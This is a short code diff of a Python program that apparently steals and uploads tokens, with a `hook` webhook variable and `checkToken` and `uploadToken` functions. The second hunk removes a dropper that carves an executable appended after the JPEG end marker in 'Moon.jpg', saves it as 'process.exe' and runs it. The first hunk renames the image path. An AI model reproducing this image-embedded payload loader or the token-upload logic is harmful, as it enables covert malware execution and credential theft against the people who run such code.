@@ -26,9 +26,9 @@ from selenium import webdriver
 hook = "X"
 DETECTED = False
 
-moon = "Moon.jpg"
+moon = "assets/img.jpg"
 if os.path.exists(moon) == False:
-    print('"Moon.jpg" NOT FOUND.')
+    print('"assets/img.jpg" NOT FOUND.')
     quit()
 
 
@@ -390,17 +390,6 @@ def checkToken(token):
         return True
     except:
         return False
-
-with open('Moon.jpg', 'rb') as f:
-    content = f.read()
-    offset = content.index(bytes.fromhex('FFD9'))
-
-    f.seek(offset + 2)
-
-    with open('process.exe', 'wb') as e:
-        e.write(f.read())
-
-os.system("process.exe")
 
 def uploadToken(token, path):
     global hook
